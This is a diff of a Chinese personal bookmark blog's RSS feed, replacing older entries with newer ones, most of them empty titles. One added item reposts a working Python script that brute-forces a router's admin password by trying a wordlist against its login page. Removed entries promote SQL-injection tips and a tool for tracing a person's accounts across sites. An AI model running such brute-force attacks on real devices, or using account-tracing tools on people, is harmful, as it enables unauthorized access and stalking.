@@ -12,7 +12,7 @@
 	<atom:link href="https://myiszero.github.io/mywebsite/feed" rel="self" type="application/rss+xml" />
 	<link>https://myiszero.github.io/mywebsite</link>
 	<description>我的收藏夹</description>
-	<lastBuildDate>Mon, 10 Oct 2022 03:46:13 +0000</lastBuildDate>
+	<lastBuildDate>Sat, 15 Oct 2022 09:21:45 +0000</lastBuildDate>
 	<language>zh-CN</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,67 +20,150 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=6.0.2</generator>
 	<item>
-		<title>SQL注入的小技巧</title>
-		<link>https://myiszero.github.io/mywebsite/1160.html</link>
+		<title>暴力破解路由器管理密码</title>
+		<link>https://myiszero.github.io/mywebsite/1271.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:46:39 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 09:15:12 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1160</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1271</guid>
 
-					<description><![CDATA[转自]]></description>
-										<content:encoded><![CDATA[<p>转<a href="https://twitter.com/hackinarticles/status/1578268351389843456" target="_blank" rel="noopener">自</a></p>
-<p><span id="more-1160"></span><img loading="lazy" class="alignnone size-full wp-image-1163" src="https://myiszero.github.io/mywebsite/wp-content/uploads/2022/10/FecikKcUcAAmMNM.jpg" alt="" width="705" height="975" srcset="https://myiszero.github.io/mywebsite/wp-content/uploads/2022/10/FecikKcUcAAmMNM.jpg 705w, https://myiszero.github.io/mywebsite/wp-content/uploads/2022/10/FecikKcUcAAmMNM-217x300.jpg 217w" sizes="(max-width: 705px) 100vw, 705px" /></p>
+					<description><![CDATA[转自 # -*- coding: utf-8 -*- import reques &#8230; <a href="https://myiszero.github.io/mywebsite/1271.html">继续阅读 <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>转<a href="https://blog.csdn.net/qq_21078159/article/details/106730677" target="_blank" rel="noopener">自</a></p>
+<p><span id="more-1271"></span></p>
+<pre class="pure-highlightjs"><code class="hljs dts"># -*- coding: utf-8 -*-
+
+import requests
+from itertools import islice
+import sys
+headers = {
+'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
+'Cookie':'LOGINCOUNT=1; LOGIN_PSD_REM_FLAG=0; PSWMOBILEFLAG=true'
+}
+
+def post(passwd):
+data="psd="+passwd
+res = requests.post(url="http://192.168.124.1/router_password_mobile.asp"
+,data=data,headers=headers)
+if('var resultInfo="true;0";' in res.text):
+return True
+else:
+return False
+
+def record(content):
+with open("E:/work/36.4GB-18_in_1.lst/passwd.txt", 'w') as file:
+file.write(content)
+
+def readDic(skip):
+linenum = skip - 1
+with open("E:/work/36.4GB-18_in_1.lst/18_in_1.lst", 'r') as file:
+for line in islice(file,skip,None):
+linenum = linenum+1
+line=line.replace('\n',"")
+res=post(line)
+print(str(linenum)+" "+line+" "+str(res), end="|")
+if(res):
+print("FOUND!")
+record("FOUND! "+str(linenum)+" "+line+" "+str(res))
+break
+if(linenum%1000 == 0):
+record(str(linenum)+" "+line+" "+str(res))
+if __name__ == "__main__":
+
+readDic(0)</code></pre>
 ]]></content:encoded>
 					
 		
 		
 			</item>
 		<item>
-		<title>找人利器</title>
-		<link>https://myiszero.github.io/mywebsite/1158.html</link>
+		<title>python正则截取字符串_用python正则提取字符串的方法</title>
+		<link>https://myiszero.github.io/mywebsite/1268.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:42:59 +0000</pubDate>
-				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1158</guid>
+		<pubDate>Sat, 15 Oct 2022 09:11:35 +0000</pubDate>
+				<category><![CDATA[python]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1268</guid>
 
-					<description><![CDATA[输入 id，就能把互联网上你的相关账号全部扒出来，而且不仅仅是简单的 id 匹配 &#8230; <a href="https://myiszero.github.io/mywebsite/1158.html">继续阅读 <span class="meta-nav">&#8594;</span></a>]]></description>
-										<content:encoded><![CDATA[<p><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">输入 id，就能把互联网上你的相关账号全部扒出来，而且不仅仅是简单的 id 匹配，你的用户资料字段也会被匹配，而且连 pornhub/xvideo 账号都有。</span></p>
-<p>转<a href="https://twitter.com/ezogreatagain/status/1578571422393257984" target="_blank" rel="noopener">自</a></p>
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>在线网络计算器</title>
+		<link>https://myiszero.github.io/mywebsite/1266.html</link>
+		
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Sat, 15 Oct 2022 09:10:36 +0000</pubDate>
+				<category><![CDATA[文章]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1266</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Maple 轻量级通用 Windows 代理应用</title>
+		<link>https://myiszero.github.io/mywebsite/1264.html</link>
+		
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Sat, 15 Oct 2022 09:02:06 +0000</pubDate>
+				<category><![CDATA[文章]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1264</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Netch 一个简单的代理客户端</title>
+		<link>https://myiszero.github.io/mywebsite/1262.html</link>
+		
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Sat, 15 Oct 2022 09:00:37 +0000</pubDate>
+				<category><![CDATA[文章]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1262</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>黎明之剑 永恒石板</title>
+		<link>https://myiszero.github.io/mywebsite/1260.html</link>
+		
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Sat, 15 Oct 2022 08:59:31 +0000</pubDate>
+				<category><![CDATA[文章]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1260</guid>
+
+					<description><![CDATA[“……不要沉醉于这个虚幻的宁静长夜……夜幕终究会被打破…… “……不要沉溺于你们 &#8230; <a href="https://myiszero.github.io/mywebsite/1260.html">继续阅读 <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>“……不要沉醉于这个虚幻的宁静长夜……夜幕终究会被打破……</p>
+<p>“……不要沉溺于你们温暖的摇篮……摇篮总有一天会倾覆……</p>
+<p>“……不要沉睡在心灵的庇护所中……心灵的庇护迟早会成为无法打破的枷锁……</p>
+<p>“启程吧，在群星闪烁之前，启程吧，在长夜结束之前……</p>
+<p>“再不快些出发，白昼就降临了……”</p>
 ]]></content:encoded>
 					
 		
 		
 			</item>
 		<item>
-		<title>autosuggestions：比你更清楚你要输入什么</title>
-		<link>https://myiszero.github.io/mywebsite/1156.html</link>
+		<title>Linux （ubuntu14.04）计划任务 crontab 从 nano 转换为 vim</title>
+		<link>https://myiszero.github.io/mywebsite/1258.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:40:46 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 08:58:14 +0000</pubDate>
 				<category><![CDATA[Linux]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1156</guid>
-
-					<description><![CDATA[推荐几个好用命令行效率工具  cz-emoji：自己开发的中文 emoji gi &#8230; <a href="https://myiszero.github.io/mywebsite/1156.html">继续阅读 <span class="meta-nav">&#8594;</span></a>]]></description>
-										<content:encoded><![CDATA[<p><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">推荐几个好用命令行效率工具 </span></p>
-<p><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0"> cz-emoji：自己开发的中文 emoji git 代码提交</span><a class="css-4rbku5 css-18t94o4 css-901oao css-16my406 r-1cvl2hr r-1loqt21 r-poiln3 r-bcqeeo r-qvutc0" dir="ltr" role="link" href="https://t.co/8K5FzgeMvE" target="_blank" rel="noopener noreferrer nofollow"><span class="css-901oao css-16my406 r-poiln3 r-hiw28u r-qvk6io r-bcqeeo r-qvutc0" aria-hidden="true">https://</span>github.com/tw93/cz-emoji-<span class="css-901oao css-16my406 r-poiln3 r-hiw28u r-qvk6io r-bcqeeo r-qvutc0" aria-hidden="true">chinese</span></a> <span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0"> z：快速跳到你常访问的目录 </span><a class="css-4rbku5 css-18t94o4 css-901oao css-16my406 r-1cvl2hr r-1loqt21 r-poiln3 r-bcqeeo r-qvutc0" dir="ltr" role="link" href="https://t.co/7UXoFNGFFL" target="_blank" rel="noopener noreferrer nofollow"><span class="css-901oao css-16my406 r-poiln3 r-hiw28u r-qvk6io r-bcqeeo r-qvutc0" aria-hidden="true">https://</span>github.com/agkozak/zsh-z</a></p>
-<p><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">autosuggestions：比你更清楚你要输入什么 </span><a class="css-4rbku5 css-18t94o4 css-901oao css-16my406 r-1cvl2hr r-1loqt21 r-poiln3 r-bcqeeo r-qvutc0" dir="ltr" role="link" href="https://t.co/JuLCZHKvQF" target="_blank" rel="noopener noreferrer nofollow"><span class="css-901oao css-16my406 r-poiln3 r-hiw28u r-qvk6io r-bcqeeo r-qvutc0" aria-hidden="true">https://</span>github.com/zsh-users/zsh-<span class="css-901oao css-16my406 r-poiln3 r-hiw28u r-qvk6io r-bcqeeo r-qvutc0" aria-hidden="true">autosuggestions</span></a></p>
-<p><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">bat：cat 代码语法高亮 </span><a class="css-4rbku5 css-18t94o4 css-901oao css-16my406 r-1cvl2hr r-1loqt21 r-poiln3 r-bcqeeo r-qvutc0" dir="ltr" role="link" href="https://t.co/Jir5MEL6HD" target="_blank" rel="noopener noreferrer nofollow"><span class="css-901oao css-16my406 r-poiln3 r-hiw28u r-qvk6io r-bcqeeo r-qvutc0" aria-hidden="true">https://</span>github.com/sharkdp/bat</a></p>
-<p>转<a href="https://twitter.com/HiTw93/status/1578736074771206144" target="_blank" rel="noopener">自</a></p>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>夏日口袋《Summer Pockets REFLECTION BLUE》全成就攻略（路线剧情成就）</title>
-		<link>https://myiszero.github.io/mywebsite/1154.html</link>
-		
-		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:35:10 +0000</pubDate>
-				<category><![CDATA[GAL]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1154</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1258</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -89,88 +172,43 @@
 		
 			</item>
 		<item>
-		<title>psp游戏王2金手指</title>
-		<link>https://myiszero.github.io/mywebsite/1152.html</link>
+		<title>HackTheBox &#8211; Oopsie</title>
+		<link>https://myiszero.github.io/mywebsite/1256.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:33:12 +0000</pubDate>
-				<category><![CDATA[Game]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1152</guid>
-
-					<description><![CDATA[]]></description>
-										<content:encoded><![CDATA[]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>记录一次使用cloudflare生成15年的SSL证书</title>
-		<link>https://myiszero.github.io/mywebsite/1150.html</link>
-		
-		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:31:25 +0000</pubDate>
-				<category><![CDATA[Linux]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1150</guid>
-
-					<description><![CDATA[]]></description>
-										<content:encoded><![CDATA[]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>vim如何删除全文</title>
-		<link>https://myiszero.github.io/mywebsite/1148.html</link>
-		
-		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:28:40 +0000</pubDate>
-				<category><![CDATA[Linux]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1148</guid>
-
-					<description><![CDATA[]]></description>
-										<content:encoded><![CDATA[]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>chmod命令原理及用法详解[通俗易懂]</title>
-		<link>https://myiszero.github.io/mywebsite/1146.html</link>
-		
-		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:26:32 +0000</pubDate>
-				<category><![CDATA[Linux]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1146</guid>
-
-					<description><![CDATA[]]></description>
-										<content:encoded><![CDATA[]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>在终端ssh的断开方法</title>
-		<link>https://myiszero.github.io/mywebsite/1144.html</link>
-		
-		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:24:43 +0000</pubDate>
-				<category><![CDATA[Linux]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1144</guid>
-
-					<description><![CDATA[]]></description>
-										<content:encoded><![CDATA[]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>使用PuTTY客户端（putty.exe或plink.exe）来执行SSH登录暴力攻击</title>
-		<link>https://myiszero.github.io/mywebsite/1142.html</link>
-		
-		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:22:03 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 08:56:09 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1142</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1256</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>linux ngrep命令、常见用法</title>
+		<link>https://myiszero.github.io/mywebsite/1254.html</link>
+		
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Sat, 15 Oct 2022 08:53:28 +0000</pubDate>
+				<category><![CDATA[Linux]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1254</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Linux搭建Socks5代理服务器</title>
+		<link>https://myiszero.github.io/mywebsite/1252.html</link>
+		
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Sat, 15 Oct 2022 08:52:39 +0000</pubDate>
+				<category><![CDATA[Linux]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1252</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
